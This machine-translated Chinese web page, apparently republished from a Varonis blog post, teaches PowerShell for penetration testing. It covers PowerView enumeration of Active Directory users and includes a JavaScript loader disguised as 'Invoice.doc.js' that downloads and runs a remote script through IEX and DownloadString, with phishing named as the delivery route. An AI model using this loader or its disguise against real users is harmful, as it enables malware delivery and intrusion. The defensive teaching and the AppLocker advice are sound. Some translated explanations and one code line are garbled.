<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>✊ ♠️ 🙏🏻 PowerShell作为Pentest工具：Varonis脚本和示例 👆 🤜🏾 🐰</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="黑客喜欢使用PowerShell运行“无文件恶意软件”，这是非传统的二进制恶意软件，没有经过编译的恶意代码，因此防病毒解决方案有时无法检测到这种恶意软件。 

 当然，PowerShell始终具有完全正常的用途，起初与渗透测试完全无关。 那些想了解PowerShell的背景的人应该阅读著名的Mona...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PowerShell作为Pentest工具：Varonis脚本和示例</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/471420/"><img src="https://habrastorage.org/webt/yz/rz/dv/yzrzdvxroj9qy1wcx-68ukv3leq.png"><br><br> 黑客喜欢使用PowerShell运行“无文件恶意软件”，这是非传统的二进制恶意软件，没有经过编译的恶意代码，因此防病毒解决方案有时无法检测到这种恶意软件。 <br><br> 当然，PowerShell始终具有完全正常的用途，起初与渗透测试完全无关。 那些想了解PowerShell的背景的人应该阅读著名的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Monad Manifesto</a> 。 该宣言由一位原始开发人员撰写，解释了为什么Microsoft需要一种新的脚本语言（换句话说，脚本），最终将其变成PowerShell。 <br><a name="habracut"></a><br> 为了避免查看冗长的17页文档的麻烦，我向您介绍了促使PowerShell作者使用的主要动机：应该使系统管理员可以从命令行访问.Net对象，从而可以在系统级别（而不是在系统级别）自动化工作流在C＃或C ++的深度编程级别。 <br><br> 如果您想获得有关PowerShell（以下称为PS）有效性的真实证据，请询问系统管理员，他们如何将用户大量添加到Active Directory或执行快速安全设置。 您很可能会了解<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PowerShell解决方案</a> 。 简而言之：PS是减少日常工作并提高管理员工作效率的好方法。 <br><br><h2>  <font color="#D21927">为什么要使用PowerShell进行渗透测试？</font> </h2><br> 不幸的是，非常适合管理员使用的功能强大的自动化工具最终对黑客和渗透测试人员都非常有用。 <br><br> 假设IT管理员的任务是弄清楚谁真正使用了负载不足的服务器。 使用PowerShell和高级功能的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">PowerView</a>库，系统管理员可以快速查看登录到服务器的用户<i>，而无需</i>登录到该服务器本身： <br><br><img src="https://habrastorage.org/webt/vd/uj/4j/vduj4jfbtmqjuu1ewwqyxdqyiw4.png"><br><br> 但是，以前通过网络钓鱼攻击获得访问权限的网络罪犯也可以这样做， 它们在Active Directory域（以下称为AD）中可以使用相同的功能。 而且不一定会检测到它们的活动：监视应用程序使用的信息安全分析师可能会得出结论，由于<i>它只是PowerShell，因此必须无害</i> 。 <br><br> 为了进一步加剧此示例，黑客甚至可以使用Get-NetUser命令获取有关单个用户的所有详细信息，该命令将在AD中转储所有用户属性： <br><br><img src="https://habrastorage.org/webt/0k/xe/pf/0kxepfiywrasehvmphwsez5we9e.png"><br><br> 不幸的是，公司有时会忽略所有员工公开的广告属性，例如家庭或移动电话，地址等。 在使用PowerShell之前，要从AD收集所有这些数据要困难得多，但是这种情况已经很长时间了！ <br><br> 攻击者可以利用此信息做什么？ 他们可以轻松利用<i>社交工程</i>方法并为此发动攻击：也许通过发送 <br> 具有从AD属性派生的足够个人上下文的电子邮件，看起来像是合法的支持请求，要求您“重置密码”。 <br><br> 顺便说一句，您也可以将ACL控件应用于AD属性，因此有一种（！）方式可以降低此类攻击的风险。 这是您从自己的渗透测试经验中可以获得的积极结果之一。 <br><br><img src="https://habrastorage.org/webt/j3/pw/qy/j3pwqywf-zkdv4k043qheddjmne.png"><br><br><h2>  <font color="#D21927">PowerShell Pentester教程</font> </h2><br> 使用PowerShell，攻击者可以谨慎收集内部用户数据，然后在攻击中使用它们。 但是，没有理由为什么IT或信息安全人员也无法学习足够的PowerShell来启动自己的测试并学习理解黑客的思维方式和动机。 <br><br> 关于PowerShell的第一件事是，您从cmd.exe命令行运行的所有旧脚本和bat文件仍可在PowerShell控制台中运行。 已经不错了，是吗？ <br><br> 下一个重要的一点是，与类似Linux的外壳程序不同，PowerShell将所有内容都视为<i>一个对象</i> 。 甚至命令的输出（仅考虑）也是一个对象。 <br><br> 例如，在控制台中输入<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Get-ChildItem</a>命令（或以另一种方式使用cmdlet，因为在PS世界中称为命令），您将在当前目录中看到文件列表： <br><br><img src="https://habrastorage.org/webt/wd/0g/vp/wd0gvpktcvbl8m3ol0qqzms9xx4.png"><br><br><h3>  <font color="#D21927">PowerShell编码</font> </h3><br> 假设您要编写一个PS脚本，其中仅显示<i>大于10 MB的</i>文件-例如，以快速检查哪些文件占用了大量空间。 在bash shell的字符串输出中，解决此任务将更加困难。 但是，在PowerShell中，任何命令的输出本身就是具有一组<i>attribute</i>的对象。 <br><br> 为此，只需将GetChildItem输出传递给<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Get-Member</a> ，它将告诉您PS cmdlet的属性： <br><br><img src="https://habrastorage.org/webt/ax/2s/4b/ax2s4bab8oyaibmvzitbhdsayiq.png"><br><br> 因此，现在我们有了我们感兴趣的两个属性的标识符：长度“ length”和名称“ name”，我们可以通过编程方式引用它们。  5分钟-正常飞行。 <br><br> 为了应对对象有时位于数组或集合中的频繁情况，我们将使用<i>ForEach</i> PS运算符在数组上进行迭代。 <br><br> 为了使事情变得更加容易，别名或别名“％”表示“ ForEach”，而“ $ _”表示当前对象。 <br><br><h3>  <font color="#D21927">使用PowerShell运行命令</font> </h3><br> 根据我们的新知识，让我们从GetChildItem命令获得两个输出列。 下面的示例是带有Get-ChildItem的管道，该管道为ForEach语句提供了内容，该语句仅显示“ length”和“ name”属性的值： <br><br><pre><code class="plaintext hljs">get-childitem | % {write-host $_.length $_.name -separator "`t`t"}</code> </pre> <br> 这是运行命令的结果： <br><br><img src="https://habrastorage.org/webt/ic/fp/ag/icfpag8gul8ihfk--_tkqgdkzpk.png"><br><br> 为了完成我们的华丽示例，让我们调整脚本以仅输出大于10MB的大文件。 为此，我们使用带有便利别名“？”的称为<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Where-Object cmdlet</a>的过滤器，它具有所有常用的比较运算符（-gt，-eq，-lt等），我们将其插入管道的中间位置现在，脚本如下所示： <br><br><pre> <code class="plaintext hljs"> get-ChildItem | ? {$_.length –gt 10000000 | % {write-host$_.length $_.name -separator "`t`t"}</code> </pre> <br> 作为练习，请尝试在自己的环境中运行上述PS创建。 <br><br><h2>  <font color="#D21927">教程：PowerShell渗透测试示例</font> </h2><br> 凭借对PowerShell的少量了解，我们准备好接受一个非常真实的渗透测试示例。 进入渗透测试的最快方法之一是使用PowerShell隐藏有效负载。 我们<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">在这里</a>写了关于如何<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">做的文章</a> 。 <br><br> 这个想法是将我们的PowerShell代码隐藏在带有后缀.doc的标准Office文档中。 实际上，该文件将具有扩展名.js，并且在单击该文件时，它将激活<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Windows脚本</a>的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">启动</a>以运行JavaScript，然后它将启动内置的PowerShell代码。 <br><br> 有点困惑，对吧？ 但是，真正的黑客不会使用一种，而是使用多层嵌套和混淆，以便尽可能隐藏和混淆攻击。 <br><br><h3>  <font color="#D21927">引导加载程序和有效负载准备</font> </h3><br> 脚本如下所示： <br><br><pre> <code class="plaintext hljs">a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')",1,true);</code> </pre> <br> 您将上面的代码粘贴到文本文件中，并将其重命名为<i>Invoice.doc.js之</i>类的<i>东西</i> 。 上面的JavaScript就像一个加载程序，使用内置的PowerShell <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">NetWebClient</a>和<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Invoke-Expression</a> cmdlet运行，这些cmdlet本身就是“％”的别名。 <br><br>  NetWebClient cmdlet的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">DownloadString</a>方法远程提取实际的有效负载，最终将为我们完成所有的工作。 <br><br> 您可以插入指向您自己的测试程序的URL。 好吧，Invoke-Expression cmdlet接受恶意文件的代码，然后执行它。 <br><br><h3>  <font color="#D21927">看看吧！</font> </h3><br> 在我的情况下，URL指向一个Github项目，其中包含一个简单的PS Write-Host命令，该命令将对全人类显示无害但重要的信息。 在真正的攻击中，这种情况的文件很可能会附加到网络钓鱼邮件列表中，这将诱使毫无戒心的员工陷入好奇的陷阱。 而且有效载荷将更具破坏性。 <br><br><img src="https://habrastorage.org/webt/xu/xl/9w/xuxl9wgbtv0tmkyxmzuq1paqvyu.png"><br><br> 您可以在自己的安装上尝试此操作。 如果上述所有方法均能成功完成，那么您还有另外一项紧迫而重要的任务，必须毫无疑问地完成。 <br><br><h2>  <font color="#D21927">渗透测试的好处</font> </h2><br><img src="https://habrastorage.org/webt/up/uh/os/upuhostqscl7nnjnwnwlmhp2d1u.png"><br><br> 这导致我们进行渗透测试的原因。 首先想到的是三个真正的好处： <br><br><ol><li> 通过将PowerShell团队作为一个耗时的团队进行探索，您将了解黑客如何“破解”这种出色的下一代脚本语言。 只要考虑一下DownloadString和Invoke-Expression方法的组合，攻击者就可以将远程恶意代码提取到受害者的站点， <i>而</i>无需在两者之间进行保存。 </li><li> 此练习还强调了现代黑客的机密性。 我在上面的示例中展示了一种不会留下任何文件的攻击方案。 因此，您不能使用基于标准签名的方法来可靠地检测使用PowerShell执行的攻击。 顺带一提，我们没有恶意软件本身的特征进行比较。 </li><li> 您可能会开始探索<i>限制</i> PowerShell和其他基于脚本的方法的方法。 最后，攻击始于脚本，因此，如果公司难以运行脚本，则可以大大降低其风险。 </li></ol><br> 让我详细说明最后一点。 您很可能不想完全禁止PowerShell（或JavaScript），因为这是Windows系统软件的基本组成部分。 幸运的是，Microsoft有一种方法可以通过<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">AppLocker</a> （现代组策略（GPO）中旧软件限制策略的改进版本）有选择地禁用脚本（和其他可执行文件）。 <br><br> 对于技术人员来说，这似乎令人难以置信，但是大多数普通用户不需要PowerShell或其他脚本语言来进行日常工作。 我知道，这当然令人震惊！ 例如，可以将AppLocker配置为禁用大众的PowerShell访问，同时允许系统管理员继续辛勤工作。 <br><br> 基于脚本的攻击（包括与电子邮件附件相关的攻击）依靠管理员为员工提供过宽的脚本权限。 而事实并非如此！ </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN471420/">https://habr.com/ru/post/zh-CN471420/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN471404/index.html">通过在另一个国家担任工程师可以赚更多的钱吗？</a></li>
<li><a href="../zh-CN471408/index.html">嗡嗡声相位逆变器的替代产品：传输线（TQWT，ALT）</a></li>
<li><a href="../zh-CN471412/index.html">有关台式机上一堆垃圾的帖子</a></li>
<li><a href="../zh-CN471414/index.html">领先的帮助台系统。 我们如何获得需求并开发云服务？</a></li>
<li><a href="../zh-CN471418/index.html">VR市场可以教给游戏设计师什么？</a></li>
<li><a href="../zh-CN471424/index.html">Nitro的故事，专业的翻译服务，可帮助开发人员进行本地化和多语言支持</a></li>
<li><a href="../zh-CN471426/index.html">IT如何极大地帮助集体农场“共产主义之道”或农业控股</a></li>
<li><a href="../zh-CN471430/index.html">如何与内部评论家进行谈判</a></li>
<li><a href="../zh-CN471432/index.html">恶毒的Aftershokz耳机，或Marvel的灵感来源和灵感来源</a></li>
<li><a href="../zh-CN471434/index.html">在Linux上自动登录Lync会议</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>